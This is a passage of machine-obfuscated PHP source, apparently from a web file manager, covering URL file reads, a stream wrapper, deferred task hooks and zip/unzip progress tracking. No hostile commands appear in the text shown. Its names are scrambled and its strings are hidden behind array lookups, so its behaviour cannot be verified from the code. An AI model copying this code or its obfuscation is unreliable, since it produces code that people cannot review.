$äÕÈÑ×ç =& $_SERVER[¹àö™Ç¾]; return Action($äÕÈÑ×ç[1158])->sharePathInfo($this->pathParse[$äÕÈÑ×ç[88]], !0, $¸†áš®); } public function listPath($‘«üş—, $Òëå”×ô = false) { $‰‘÷À½¦ =& $_SERVER[¹àö™Ç¾]; $è¼åç‰Ä = parent::listPath($‘«üş—, $Òëå”×ô); if (!$è¼åç‰Ä) { return $è¼åç‰Ä; } if (is_array($è¼åç‰Ä[$‰‘÷À½¦[1319]])) { $è¼åç‰Ä[$‰‘÷À½¦[1319]] = Action($‰‘÷À½¦[1158])->shareItemInfo($è¼åç‰Ä[$‰‘÷À½¦[1319]]); } foreach ($è¼åç‰Ä as $©Ğ”Ïñú => $Óº§±ˆ) { if (!in_array($©Ğ”Ïñú, array($‰‘÷À½¦[86], $‰‘÷À½¦[87]))) { continue; } foreach ($Óº§±ˆ as $ìä»¸Ä => $ŸÊóäãÀ) { $è¼åç‰Ä[$©Ğ”Ïñú][$ìä»¸Ä] = Action($‰‘÷À½¦[1158])->shareItemInfo($ŸÊóäãÀ); } } return $è¼åç‰Ä; } public function listAll($õïä»º) { $´³¶µ‚ =& $_SERVER[¹àö™Ç¾]; $ßÉù¶Ïë = IO::info($this->pathParse[$´³¶µ‚[88]]); if (!$ßÉù¶Ïë) { return array(); } $àÍò‡ÍÙ = $this->model->listAll($õïä»º); foreach ($àÍò‡ÍÙ as &$öµ¯ô•ƒ) { $öµ¯ô•ƒ[$´³¶µ‚[97]] = Action($´³¶µ‚[1158])->shareItemInfo($öµ¯ô•ƒ[$´³¶µ‚[97]]); } unset($öµ¯ô•ƒ); return $àÍò‡ÍÙ; } } goto eõÓ“ÆšÃÍ; A‡ØÒî ×: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¬—ƒÙ§Æ = false) { } public function exist($õú†³¢ú) { $©É’¤§× = $this->info($õú†³¢ú); return $©É’¤§×[$_SERVER[¹àö™Ç¾][204]]; } public function isFile($€ĞÇˆÍà) { $ì¡ÒËùÈ = $this->info($€ĞÇˆÍà); return $ì¡ÒËùÈ[$_SERVER[¹àö™Ç¾][204]]; } public function isFolder($¸Ÿ«Ü»Ó) { return !1; } public function size($ÂÓ’Ê„ˆ) { $Ç¶ü«Úâ = $this->info($ÂÓ’Ê„ˆ); return $Ç¶ü«Úâ[$_SERVER[¹àö™Ç¾][90]]; } public function info($ìöÃ ¬) { return $this->infoParse($ìöÃ ¬); } public function infoAuth($Õ¯†ë¥) { return $this->infoParse($Õ¯†ë¥); } public function infoWithChildren($ñ×çÙØ°) { return $this->infoParse($ñ×çÙØ°); } public function infoFull($Šåš½™Î) { return $this->infoParse($Šåš½™Î); } private function infoParse($ó÷·“ç˜) { $Ã¤µï€£ =& $_SERVER[¹àö™Ç¾]; $€¢×ŸÖ = $this->header($ó÷·“ç˜); if (!$€¢×ŸÖ || !$€¢×ŸÖ[$Ã¤µï€£[742]]) { return !1; } $ŞßÀÆÙÌ = _get($€¢×ŸÖ, $Ã¤µï€£[341], 0); $‹şó½ëı = array($Ã¤µï€£[42] => $€¢×ŸÖ[$Ã¤µï€£[42]], $Ã¤µï€£[88] => $ó÷·“ç˜, $Ã¤µï€£[43] => $Ã¤µï€£[202], $Ã¤µï€£[90] => intval($ŞßÀÆÙÌ), $Ã¤µï€£[177] => get_path_ext($€¢×ŸÖ[$Ã¤µï€£[42]]), $Ã¤µï€£[1361] => $ŞßÀÆÙÌ > 0 && $€¢×ŸÖ[$Ã¤µï€£[1483]], $Ã¤µï€£[1362] => !1); return $‹şó½ëı; } private function header($ßÚç¦†•) { $ùÓ¼àÒ§ =& $_SERVER[¹àö™Ç¾]; if (isset(self::$_cacheHeader[$ßÚç¦†•])) { return self::$_cacheHeader[$ßÚç¦†•]; } $Öª¬ç³ê = isset($GLOBALS[$ùÓ¼àÒ§[1484]]) ? $GLOBALS[$ùÓ¼àÒ§[1484]] : !1; $GLOBALS[$ùÓ¼àÒ§[1484]] = !0; self::$_cacheHeader[$ßÚç¦†•] = url_header($ßÚç¦†•); $GLOBALS[$ùÓ¼àÒ§[1484]] = $Öª¬ç³ê; return self::$_cacheHeader[$ßÚç¦†•]; } public function hashSimple($ÇÔşÄ°, $°ÅÒéÊ = false) { $´”œÅÉ§ =& $_SERVER[¹àö™Ç¾]; $¥ê­‡ç‹ = $this->info($ÇÔşÄ°); if (!$¥ê­‡ç‹ || !$¥ê­‡ç‹[$´”œÅÉ§[204]]) { return !1; } $ğìÑËªÍ = $¥ê­‡ç‹[$´”œÅÉ§[90]]; $Àœ·Ì¸ = 200; $ø½¦ˆ¾È = 50; if ($ğìÑËªÍ <= $Àœ·Ì¸ * $ø½¦ˆ¾È) { return md5($this->fileSubstr($ÇÔşÄ°, 0, $ğìÑËªÍ)) . $ğìÑËªÍ; } $İÊÔ„ø = intval($ğìÑËªÍ / $ø½¦ˆ¾È); $îø»˜Àƒ = $´”œÅÉ§[22]; $Æš‘Ùå¨ = timeFloat(); $ÖŞ«ò€â = 15; for ($ÑÍß¥¡’ = 0; $ÑÍß¥¡’ < $ø½¦ˆ¾È; $ÑÍß¥¡’++) { if (timeFloat() - $Æš‘Ùå¨ > $ÖŞ«ò€â) { return !1; } $Â¢îùÊù = $this->fileSubstr($ÇÔşÄ°, $İÊÔ„ø * $ÑÍß¥¡’, $Àœ·Ì¸); if (!$Â¢îùÊù) { return !1; } $îø»˜Àƒ .= $Â¢îùÊù; } $îø»˜Àƒ .= $this->fileSubstr($ÇÔşÄ°, $ğìÑËªÍ - $Àœ·Ì¸, $Àœ·Ì¸); return md5($îø»˜Àƒ) . $ğìÑËªÍ; } public function getContent($–æÊËÓû) { return $this->fileSubstr($–æÊËÓû); } public function fileSubstr($¹„Éàˆ¨, $¶ö€ÍÀ = 0, $ùĞ½òùÌ = -1) { $Ââœ¥® =& $_SERVER[¹àö™Ç¾]; $”Í ˆ• = $this->info($¹„Éàˆ¨); if (!$”Í ˆ• || !$”Í ˆ•[$Ââœ¥®[204]] && $”Í ˆ•[$Ââœ¥®[90]] > 1024 * 1024 * 10) { return !1; } if ($ùĞ½òùÌ === -1) { $ùĞ½òùÌ = $”Í ˆ•[$Ââœ¥®[90]]; } if ($ùĞ½òùÌ == 0) { return $Ââœ¥®[22]; } $Ùê³™Æà = array($Ââœ¥®[1485] . $¶ö€ÍÀ . $Ââœ¥®[774] . ($¶ö€ÍÀ + $ùĞ½òùÌ - 1)); $¡çƒ°òê = url_request($¹„Éàˆ¨, $Ââœ¥®[235], !1, $Ùê³™Æà, !1, !1, 1); return $¡çƒ°òê[$Ââœ¥®[1176]] ? $¡çƒ°òê[$Ââœ¥®[1176]] : $Ââœ¥®[22]; } public function download($ÀÜîş, $û”Ë„ˆÁ) { Downloader::start($ÀÜîş, $û”Ë„ˆÁ); return $û”Ë„ˆÁ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¥ÙœŞŞ‚, $µö ”¾œ = '') { $this->info = $this->info($¥ÙœŞŞ‚); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹àö™Ç¾][88]]; $this->pathOpen = $¥ÙœŞŞ‚; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¥ÙœŞŞ‚])) { self::$_chunkBuffer[$¥ÙœŞŞ‚] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($±†êûÆ·) { $–Å‹£Ü = $this->fileSubstr($this->pose, $±†êûÆ·); $this->pose += strlen($–Å‹£Ü); return $–Å‹£Ü; } public function stream_tell() { return $this->pose; } public function stream_seek($¼•ú°Ãœ, $Úè±Ø–³) { $àæ¬•û =& $_SERVER[¹àö™Ç¾]; if ($Úè±Ø–³ == SEEK_SET) { $this->pose = $¼•ú°Ãœ; } else { if ($Úè±Ø–³ == SEEK_CUR) { $this->pose += $¼•ú°Ãœ; } else { if ($Úè±Ø–³ == SEEK_END) { $this->pose = $this->info[$àæ¬•û[90]] + intval($¼•ú°Ãœ); } } } if ($¼•ú°Ãœ < 0) { $this->pose = $this->info[$àæ¬•û[90]] + $¼•ú°Ãœ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹àö™Ç¾][90]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($„¦Öë‰, $®Ú°êğ) { $ñ‹Ìä” =& $_SERVER[¹àö™Ç¾]; $ùë¼ÈÎœ = $this->info($„¦Öë‰); return array($ñ‹Ìä”[1486] => 0, $ñ‹Ìä”[1487] => 0, $ñ‹Ìä”[26] => 32768 + 511, $ñ‹Ìä”[1488] => 0, $ñ‹Ìä”[1489] => 0, $ñ‹Ìä”[1490] => 0, $ñ‹Ìä”[1491] => 0, $ñ‹Ìä”[90] => $ùë¼ÈÎœ[$ñ‹Ìä”[90]], $ñ‹Ìä”[1492] => $ùë¼ÈÎœ[$ñ‹Ìä”[1360]], $ñ‹Ìä”[1448] => $ùë¼ÈÎœ[$ñ‹Ìä”[96]], $ñ‹Ìä”[1447] => $ùë¼ÈÎœ[$ñ‹Ìä”[203]], $ñ‹Ìä”[1493] => 0, $ñ‹Ìä”[1494] => 0); } static $fileInfo = array(); public function info($¼ÍÉ—§) { $áÒ¡¤£– = $_SERVER[¹àö™Ç¾][1495]; if (isset(self::$fileInfo[$¼ÍÉ—§])) { return self::$fileInfo[$¼ÍÉ—§]; } if (substr($¼ÍÉ—§, 0, strlen($áÒ¡¤£–)) != $áÒ¡¤£–) { return !1; } self::$fileInfo[$¼ÍÉ—§] = IO::info(substr($¼ÍÉ—§, strlen($áÒ¡¤£–))); return self::$fileInfo[$¼ÍÉ—§]; } public static function read($³†é³°ş, $ŠıÈ•ü, $ÕÂß£×) { if (!isset(self::$_fopenCache[$³†é³°ş])) { $Ÿã¬ñƒº = new StreamWrapperIO(); $Ÿã¬ñƒº->stream_open($³†é³°ş); self::$_fopenCache[$³†é³°ş] = $Ÿã¬ñƒº; } $Ÿã¬ñƒº = self::$_fopenCache[$³†é³°ş]; return $Ÿã¬ñƒº->fileSubstr($ŠıÈ•ü, $ÕÂß£×); } public static function _read($¨ğ«ä”ø, $‰µ”—‹¸, $òäŒú) { $å‰üÉÍ‡ =& $_SERVER[¹àö™Ç¾]; $ä¿§Êßê = fopen($¨ğ«ä”ø, $å‰üÉÍ‡[1364]); if (!$ä¿§Êßê) { return $å‰üÉÍ‡[22]; } $çòçó» = 8192; fseek($ä¿§Êßê, $‰µ”—‹¸, SEEK_SET); $Š³¦Îàµ = $å‰üÉÍ‡[22]; $Ï³ûÚ™ = 0; while ($Ï³ûÚ™ < $òäŒú) { $ã–ºŸ¹Œ = min($çòçó», $òäŒú - $Ï³ûÚ™); $Š³¦Îàµ .= fread($ä¿§Êßê, $ã–ºŸ¹Œ); $Ï³ûÚ™ += $ã–ºŸ¹Œ; } fclose($ä¿§Êßê); return $Š³¦Îàµ; } public function fileSubstr($ ç›¯íÄ, $š·…Ş´ß) { $Ë”«éÙŒ =& $_SERVER[¹àö™Ç¾]; $ìğÌ©ƒ = $this->info[$Ë”«éÙŒ[90]]; $¬†ùû×ñ = $ ç›¯íÄ; $¸…ğ±Çò = $š·…Ş´ß; if ($ ç›¯íÄ < 0) { $ ç›¯íÄ = $ìğÌ©ƒ + $ ç›¯íÄ; } if ($š·…Ş´ß === !1) { $š·…Ş´ß = $ìğÌ©ƒ - $ ç›¯íÄ; } if ($ ç›¯íÄ + $š·…Ş´ß > $ìğÌ©ƒ) { $š·…Ş´ß = $ìğÌ©ƒ - $ ç›¯íÄ; } if ($š·…Ş´ß <= 0) { return $Ë”«éÙŒ[22]; } if ($ ç›¯íÄ < 0 || $ ç›¯íÄ >= $ìğÌ©ƒ || $š·…Ş´ß <= 0 || $š·…Ş´ß > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\141\144\40\x65\162\162\157\162\41\x20\163\x74\141\162\x74\x3d{$ ç›¯íÄ}\73\x6c\x65\x6e\x67\164\150\x3d{$š·…Ş´ß}\73\40\163\x69\172\x65\75{$ìğÌ©ƒ}\x3b"); } $™Æ°¼Í÷ = 64 * 1024; $–‘ğ =& self::$_chunkBuffer[$this->path]; if (!$–‘ğ) { $–‘ğ = array(); } $ıúÂ‘µ™ = 0; $š¯êØ¤ = 0; $—áö«²å = $Ë”«éÙŒ[22]; foreach ($–‘ğ as $ıúÂ‘µ™ => $—áö«²å) { $ıúÂ‘µ™ = intval($ıúÂ‘µ™); $š¯êØ¤ = $ıúÂ‘µ™ + strlen($—áö«²å); if ($ ç›¯íÄ >= $š¯êØ¤) { continue; } if ($ ç›¯íÄ >= $ıúÂ‘µ™ && $ ç›¯íÄ + $š·…Ş´ß <= $š¯êØ¤) { return substr($—áö«²å, $ ç›¯íÄ - $ıúÂ‘µ™, $š·…Ş´ß); } break; } if (count($–‘ğ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ë”«éÙŒ[1496], $Ë”«éÙŒ[1497] . count($–‘ğ) . "\73\163\x74\x61\x72\164\75{$ ç›¯íÄ}\54\154\x65\x6e\147\164\150\75{$š·…Ş´ß}\x3b\160\x6f\163\x65\x3a{$ıúÂ‘µ™}\176{$š¯êØ¤}"); throw new Exception($Ë”«éÙŒ[1498]); } $¨œšºÓ‡ = intval($ ç›¯íÄ / $™Æ°¼Í÷) * $™Æ°¼Í÷; $¡¢Ú³üà = ceil(($ ç›¯íÄ + $š·…Ş´ß) / $™Æ°¼Í÷) * $™Æ°¼Í÷ - $¨œšºÓ‡; $óôë¸Ÿ = IO::fileSubstr($this->path, $¨œšºÓ‡, $¡¢Ú³üà); $–‘ğ[$¨œšºÓ‡ . $Ë”«éÙŒ[22]] = $óôë¸Ÿ; ksort($–‘ğ); $¦İ÷´Šê = substr($óôë¸Ÿ, $ ç›¯íÄ - $¨œšºÓ‡, $š·…Ş´ß); return $¦İ÷´Šê; } private function log($ú¨ç´ô, $ö‡¦¼ñĞ) { $´îÜÙ³ =& $_SERVER[¹àö™Ç¾]; $‰ÀğÛĞ = timeFloat() - $this->timeStart; write_log(sprintf($´îÜÙ³[1499], $ú¨ç´ô, $this->info[$´îÜÙ³[42]], $‰ÀğÛĞ, $ö‡¦¼ñĞ), $´îÜÙ³[1166]); } } class Message { function __construct() { } public function send($½íÖ­Ù = '', $‘’’ƒæÅ = array(), $ÑÜŒ‘‰ş = "\x74\x65\170\164") { $ÚÎæØµ¡ =& $_SERVER[¹àö™Ç¾]; $ıĞ¡Ë­³ = array($ÚÎæØµ¡[43] => $ÚÎæØµ¡[1500], $ÚÎæØµ¡[747] => $½íÖ­Ù); if (in_array($ÑÜŒ‘‰ş, array($ÚÎæØµ¡[1500], $ÚÎæØµ¡[1501]))) { $ıĞ¡Ë­³[$ÚÎæØµ¡[43]] = $ÑÜŒ‘‰ş; } $‘’’ƒæÅ = array($ÚÎæØµ¡[515] => isset($‘’’ƒæÅ[$ÚÎæØµ¡[515]]) ? $‘’’ƒæÅ[$ÚÎæØµ¡[515]] : $ÚÎæØµ¡[22], $ÚÎæØµ¡[594] => isset($‘’’ƒæÅ[$ÚÎæØµ¡[594]]) ? $‘’’ƒæÅ[$ÚÎæØµ¡[594]] : $ÚÎæØµ¡[22]); if (empty($½íÖ­Ù) || empty($‘’’ƒæÅ[$ÚÎæØµ¡[515]]) && empty($‘’’ƒæÅ[$ÚÎæØµ¡[594]])) { return !1; } $±Ç‡“ó = array($ÚÎæØµ¡[1441] => $ıĞ¡Ë­³, $ÚÎæØµ¡[1502] => $‘’’ƒæÅ); Hook::trigger($ÚÎæØµ¡[1503], $±Ç‡“ó); } } goto b™Œ×„ÑÂ‰; d‚í¨¥ò: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÎÒíÕ¾”, $ÄÒé¦İ£ = 5.0) { if (!$ÎÒíÕ¾”) { return; } $ÉÃå—ğâ = Cache::get($ÎÒíÕ¾”); if (!$ÉÃå—ğâ || timeFloat() - floatVal($ÉÃå—ğâ) >= $ÄÒé¦İ£) { Cache::set($ÎÒíÕ¾”, timeFloat(), $ÄÒé¦İ£ * 10); return !0; } return !1; } public static function timeLimitCall($…çö¯Å, $ğÈˆ²éÆ, $Ğ’ö¢Ğ…, $¾Ñæñ¿— = 5.0) { $¿ìØ¿Óó =& $_SERVER[¹àö™Ç¾]; if (!$…çö¯Å || !$ğÈˆ²éÆ) { return; } self::$asyncAdd = !0; $ãÒª‹Ê± = $¿ìØ¿Óó[1722]; $¡Ÿ®óŒô = Cache::get($ãÒª‹Ê±, !0); $×óÜŠØì = array($¿ìØ¿Óó[1723] => timeFloat(), $¿ìØ¿Óó[1724] => timeFloat(), $¿ìØ¿Óó[268] => $ğÈˆ²éÆ, $¿ìØ¿Óó[1717] => $Ğ’ö¢Ğ…, $¿ìØ¿Óó[206] => $¾Ñæñ¿—); if (is_array($¡Ÿ®óŒô[$…çö¯Å])) { $×óÜŠØì[$¿ìØ¿Óó[1724]] = $¡Ÿ®óŒô[$…çö¯Å][$¿ìØ¿Óó[1724]]; } if (is_array($¡Ÿ®óŒô[$…çö¯Å])) { if (timeFloat() - $¡Ÿ®óŒô[$…çö¯Å][$¿ìØ¿Óó[1723]] < $×óÜŠØì[$¿ìØ¿Óó[206]] * 0.3) { return; } $×óÜŠØì[$¿ìØ¿Óó[1724]] = $¡Ÿ®óŒô[$…çö¯Å][$¿ìØ¿Óó[1724]]; } $¡Ÿ®óŒô[$…çö¯Å] = $×óÜŠØì; Cache::set($ãÒª‹Ê±, $¡Ÿ®óŒô, 60); Cache::removeMemory($ãÒª‹Ê±); write_log($¿ìØ¿Óó[1725] . $…çö¯Å . $¿ìØ¿Óó[81] . $ğÈˆ²éÆ, $¿ìØ¿Óó[1719]); } public static function timeLimitCallLoop() { $ò´ì¨ =& $_SERVER[¹àö™Ç¾]; $ªÚ³ï¥ä = array($ò´ì¨[1726]); $‹¥ñ°Ó = in_array(strtolower(ACTION), $ªÚ³ï¥ä); if (!$‹¥ñ°Ó && !self::$asyncAdd) { return; } $”‘‘è÷‚ = $ò´ì¨[1722]; $ôŒ‰ëß = Cache::get($”‘‘è÷‚, !0); if (!$ôŒ‰ëß || count($ôŒ‰ëß) <= 0) { return; } $ÎîÒŒÒÛ = !1; $ù´šúñ€ = timeFloat(); $€¥Åß = array(); foreach ($ôŒ‰ëß as $ºüÖ½¿ => $ğİ¬«‹õ) { if ($ù´šúñ€ - $ğİ¬«‹õ[$ò´ì¨[1724]] > $ğİ¬«‹õ[$ò´ì¨[206]]) { $ÎîÒŒÒÛ = !0; try { Hook::apply($ğİ¬«‹õ[$ò´ì¨[268]], $ğİ¬«‹õ[$ò´ì¨[1717]]); write_log($ò´ì¨[1727] . $ºüÖ½¿ . $ò´ì¨[81] . $ğİ¬«‹õ[$ò´ì¨[268]] . $ò´ì¨[1728] . ACTION, $ò´ì¨[1719]); } catch (Exception $ß‹¡İÙ§) { } continue; } $€¥Åß[$ºüÖ½¿] = $ğİ¬«‹õ; } if (!$ÎîÒŒÒÛ) { return; } if (!$€¥Åß) { return Cache::remove($”‘‘è÷‚); } Cache::set($”‘‘è÷‚, $€¥Åß, 60); Cache::removeMemory($”‘‘è÷‚); } public static function finished($¾¯€ú“, $—ºáô¿) { $êô‡‹Õ =& $_SERVER[¹àö™Ç¾]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($êô‡‹Õ[268] => $¾¯€ú“, $êô‡‹Õ[1717] => $—ºáô¿); } private static function finishedRun() { $ïå©ìØ¬ =& $_SERVER[¹àö™Ç¾]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¹ ©Š£´) { try { Hook::apply($¹ ©Š£´[$ïå©ìØ¬[268]], $¹ ©Š£´[$ïå©ìØ¬[1717]]); } catch (Exception $å£ëÑ§û) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ªãñÄ’® =& $_SERVER[¹àö™Ç¾]; parent::startAfter(); Hook::bind($ªãñÄ’®[1729], array($this, $ªãñÄ’®[1730])); Hook::bind($ªãñÄ’®[1177], array($this, $ªãñÄ’®[1731])); $ôú’ÖŒÁ =& $this->task; $ôú’ÖŒÁ[$ªãñÄ’®[1732]] = $ªãñÄ’®[1182]; if (!$ôú’ÖŒÁ[$ªãñÄ’®[1540]]) { $ôú’ÖŒÁ[$ªãñÄ’®[1540]] = LNG($ªãñÄ’®[1733]); } } protected function endAfter() { $µş½Åè =& $_SERVER[¹àö™Ç¾]; parent::endAfter(); Hook::unbind($µş½Åè[1729], array($this, $µş½Åè[1730])); Hook::unbind($µş½Åè[1177], array($this, $µş½Åè[1731])); } public function updateAfter() { $¿“Ôº„Ú =& $_SERVER[¹àö™Ç¾]; $óîàÈğä =& $this->task; if (!$óîàÈğä[$¿“Ôº„Ú[778]] || !$óîàÈğä[$¿“Ôº„Ú[755]]) { return; } if ($óîàÈğä[$¿“Ôº„Ú[1732]] == $¿“Ôº„Ú[1182]) { $õ‚‡«ºà = 0; if ($óîàÈğä[$¿“Ôº„Ú[1688]]) { $õ‚‡«ºà = $óîàÈğä[$¿“Ôº„Ú[1689]] / $óîàÈğä[$¿“Ôº„Ú[1688]]; } $óîàÈğä[$¿“Ôº„Ú[1642]] = $õ‚‡«ºà * 0.3; } else { if ($óîàÈğä[$¿“Ôº„Ú[1732]] == $¿“Ôº„Ú[317]) { $õ‚‡«ºà = $óîàÈğä[$¿“Ôº„Ú[1641]] / $óîàÈğä[$¿“Ôº„Ú[778]]; $óîàÈğä[$¿“Ôº„Ú[1642]] = 0.3 + $õ‚‡«ºà * 0.4; } else { if ($óîàÈğä[$¿“Ôº„Ú[1732]] == $¿“Ôº„Ú[118]) { $šÉÎÀ‹ = 0; if ($óîàÈğä[$¿“Ôº„Ú[1690]] == $¿“Ôº„Ú[118]) { $šÉÎÀ‹ = $óîàÈğä[$¿“Ôº„Ú[1689]]; } $õ‚‡«ºà = ($óîàÈğä[$¿“Ôº„Ú[1693]] + $šÉÎÀ‹) / $óîàÈğä[$¿“Ôº„Ú[755]]; $óîàÈğä[$¿“Ôº„Ú[1642]] = 0.3 + 0.4 + $õ‚‡«ºà * 0.3; } } } if ($óîàÈğä[$¿“Ôº„Ú[1642]] > 0) { $Ô¾®šï = timeFloat() - $óîàÈğä[$¿“Ôº„Ú[1644]] - $óîàÈğä[$¿“Ôº„Ú[1647]]; $óîàÈğä[$¿“Ôº„Ú[1648]] = $Ô¾®šï * (1 - $óîàÈğä[$¿“Ôº„Ú[1642]]) / $óîàÈğä[$¿“Ôº„Ú[1642]]; } } public function addFile($êŒÑååû) { $ÚàÇçıÄ =& $_SERVER[¹àö™Ç¾]; $ÕƒÊƒ =& $this->task; $¤öÀÃ¢ = IO::info($êŒÑååû); $ÕƒÊƒ[$ÚàÇçıÄ[1686]] = $¤öÀÃ¢[$ÚàÇçıÄ[42]]; $ÕƒÊƒ[$ÚàÇçıÄ[1688]] = $¤öÀÃ¢[$ÚàÇçıÄ[90]]; $ÕƒÊƒ[$ÚàÇçıÄ[1689]] = 0; $ÕƒÊƒ[$ÚàÇçıÄ[1049]] = $ÚàÇçıÄ[1708]; $ÕƒÊƒ[$ÚàÇçıÄ[1690]] = $ÚàÇçıÄ[1182]; $ÕƒÊƒ[$ÚàÇçıÄ[755]] = $¤öÀÃ¢[$ÚàÇçıÄ[90]]; $ÕƒÊƒ[$ÚàÇçıÄ[778]] = 1; $Ë¢Ã¢ = 0; $ÕƒÊƒ[$ÚàÇçıÄ[1697]] = array($ÚàÇçıÄ[1698] => $Ë¢Ã¢ + 1, $ÚàÇçıÄ[421] => $¤öÀÃ¢[$ÚàÇçıÄ[42]], $ÚàÇçıÄ[88] => $¤öÀÃ¢[$ÚàÇçıÄ[88]], $ÚàÇçıÄ[519] => $¤öÀÃ¢[$ÚàÇçıÄ[519]] ? $¤öÀÃ¢[$ÚàÇçıÄ[519]] : $¤öÀÃ¢[$ÚàÇçıÄ[88]]); $this->update(); } public function unzipAfter($Ş‚Äşçš) { $şâ§ ¢÷ =& $_SERVER[¹àö™Ç¾]; $¹ ª¬ÒÚ =& $this->task; $¹ ª¬ÒÚ[$şâ§ ¢÷[1732]] = $şâ§ ¢÷[118]; $‚º¿Ûß = IO::infoWithChildren($Ş‚Äşçš); $ŞÄÀ€¯Â = 0; $¹ ª¬ÒÚ[$şâ§ ¢÷[1697]] = array($şâ§ ¢÷[1698] => $ŞÄÀ€¯Â + 1, $şâ§ ¢÷[421] => $‚º¿Ûß[$şâ§ ¢÷[42]], $şâ§ ¢÷[88] => $‚º¿Ûß[$şâ§ ¢÷[88]], $şâ§ ¢÷[519] => $‚º¿Ûß[$şâ§ ¢÷[519]] ? $‚º¿Ûß[$şâ§ ¢÷[519]] : $‚º¿Ûß[$şâ§ ¢÷[88]]); if ($‚º¿Ûß[$şâ§ ¢÷[43]] == $şâ§ ¢÷[202]) { $¹ ª¬ÒÚ[$şâ§ ¢÷[778]] = 1; } else { $¹ ª¬ÒÚ[$şâ§ ¢÷[778]] = $‚º¿Ûß[$şâ§ ¢÷[93]][$şâ§ ¢÷[91]]; } $¹ ª¬ÒÚ[$şâ§ ¢÷[1049]] = $şâ§ ¢÷[22]; $¹ ª¬ÒÚ[$şâ§ ¢÷[1690]] = 0; $¹ ª¬ÒÚ[$şâ§ ¢÷[1641]] = 0; $¹ ª¬ÒÚ[$şâ§ ¢÷[1688]] = 0; $¹ ª¬ÒÚ[$şâ§ ¢÷[1689]] = 0; $¹ ª¬ÒÚ[$şâ§ ¢÷[1686]] = $şâ§ ¢÷[22]; $¹ ª¬ÒÚ[$şâ§ ¢÷[1693]] = 0; $¹ ª¬ÒÚ[$şâ§ ¢÷[755]] = $‚º¿Ûß[$şâ§ ¢÷[90]]; $this->update(); self::log($şâ§ ¢÷[1734] . json_encode(array($¹ ª¬ÒÚ, $‚º¿Ûß))); } public function nameParse($ÎëìÕ) { $ºÎ–âÆ¤ =& $_SERVER[¹àö™Ç¾]; $«Ìíò¼Ò =& $this->task; if ($«Ìíò¼Ò[$ºÎ–âÆ¤[1732]] == $ºÎ–âÆ¤[1182]) { $«Ìíò¼Ò[$ºÎ–âÆ¤[1732]] = $ºÎ–âÆ¤[317]; $«Ìíò¼Ò[$ºÎ–âÆ¤[1693]] = 0; $«Ìíò¼Ò[$ºÎ–âÆ¤[755]] = 0; } $¦ãÇ´êÓ = get_path_this($ÎëìÕ); if (strstr($¦ãÇ´êÓ, $ºÎ–âÆ¤[20])) { $«Ìíò¼Ò[$ºÎ–âÆ¤[1641]] += 1; $«Ìíò¼Ò[$ºÎ–âÆ¤[778]] += 1; } $«Ìíò¼Ò[$ºÎ–âÆ¤[1686]] = $ÎëìÕ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ËÎÅÂä =& $_SERVER[¹àö™Ç¾]; parent::startAfter(); Hook::bind($ËÎÅÂä[1735], array($this, $ËÎÅÂä[1730])); $¨û¹¾· =& $this->task; $¨û¹¾·[$ËÎÅÂä[1732]] = $ËÎÅÂä[1182]; if (!$¨û¹¾·[$ËÎÅÂä[1540]]) { $¨û¹¾·[$ËÎÅÂä[1540]] = LNG($ËÎÅÂä[1736]); } } protected function endAfter() { $ñİôè»¥ =& $_SERVER[¹àö™Ç¾]; parent::endAfter(); Hook::unbind($ñİôè»¥[1735], array($this, $ñİôè»¥[1730])); } public function updateAfter() { $³ÛìÇ·¿ =& $_SERVER[¹àö™Ç¾]; $øš”½¢ø =& $this->task; if (!$øš”½¢ø[$³ÛìÇ·¿[778]] || !$øš”½¢ø[$³ÛìÇ·¿[755]]) { return; } if ($øš”½¢ø[$³ÛìÇ·¿[1732]] == $³ÛìÇ·¿[1182]) { $…ÇöğÍ = $øš”½¢ø[$³ÛìÇ·¿[1689]]; if ($øš”½¢ø[$³ÛìÇ·¿[1690]] != $³ÛìÇ·¿[1182]) { $…ÇöğÍ = 0; } $²Ÿ§ ¹ò = ($øš”½¢ø[$³ÛìÇ·¿[1693]] + $…ÇöğÍ) / $øš”½¢ø[$³ÛìÇ·¿[755]]; $øš”½¢ø[$³ÛìÇ·¿[1642]] = $²Ÿ§ ¹ò * 0.3; } else { if ($øš”½¢ø[$³ÛìÇ·¿[1732]] == $³ÛìÇ·¿[317]) { $²Ÿ§ ¹ò = $øš”½¢ø[$³ÛìÇ·¿[1641]] / $øš”½¢ø[$³ÛìÇ·¿[778]]; $øš”½¢ø[$³ÛìÇ·¿[1642]] = 0.3 + $²Ÿ§ ¹ò * 0.5; } else { if ($øš”½¢ø[$³ÛìÇ·¿[1732]] == $³ÛìÇ·¿[118]) { $²Ÿ§ ¹ò = 0; if ($øš”½¢ø[$³ÛìÇ·¿[1688]]) { $²Ÿ§ ¹ò = $øš”½¢ø[$³ÛìÇ·¿[1689]] / $øš”½¢ø[$³ÛìÇ·¿[1688]]; } $øš”½¢ø[$³ÛìÇ·¿[1642]] = 0.3 + 0.5 + $²Ÿ§ ¹ò * 0.2; } } } if ($øš”½¢ø[$³ÛìÇ·¿[1642]] > 0) { $‹¨ùøÀ· = timeFloat() - $øš”½¢ø[$³ÛìÇ·¿[1644]] - $øš”½¢ø[$³ÛìÇ·¿[1647]]; $øš”½¢ø[$³ÛìÇ·¿[1648]] = $‹¨ùøÀ· * (1 - $øš”½¢ø[$³ÛìÇ·¿[1642]]) / $øš”½¢ø[$³ÛìÇ·¿[1642]]; } } public function 